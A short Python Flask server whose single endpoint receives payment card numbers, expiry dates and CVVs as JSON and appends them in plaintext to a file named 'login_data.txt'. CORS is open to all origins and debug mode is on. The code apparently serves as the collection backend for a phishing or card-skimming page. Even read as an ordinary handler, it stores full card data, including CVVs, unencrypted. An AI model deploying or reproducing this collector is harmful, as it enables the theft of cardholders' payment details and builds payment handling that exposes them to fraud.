from flask import Flask, request, jsonify
from flask_cors import CORS
import os

app = Flask(__name__)
CORS(app)
data_file = "login_data.txt"

@app.route('/submit', methods=['POST'])
def submit_data():
    data = request.get_json()
    card = data.get('card')
    expiry = data.get('expiry')
    cvv = data.get('cvv')

    if card and expiry:
        with open(data_file, 'a') as file:
            file.write(f"Card: {card}, Expiry: {expiry}, CVV: {cvv}\n")
        return jsonify({"message": "Data saved successfully"}), 200
    else:
        return jsonify({"message": "Invalid data"}), 400

if __name__ == "__main__":
    if not os.path.exists(data_file):
        with open(data_file, 'w') as f:
            pass
    app.run(debug=True, port=8000)
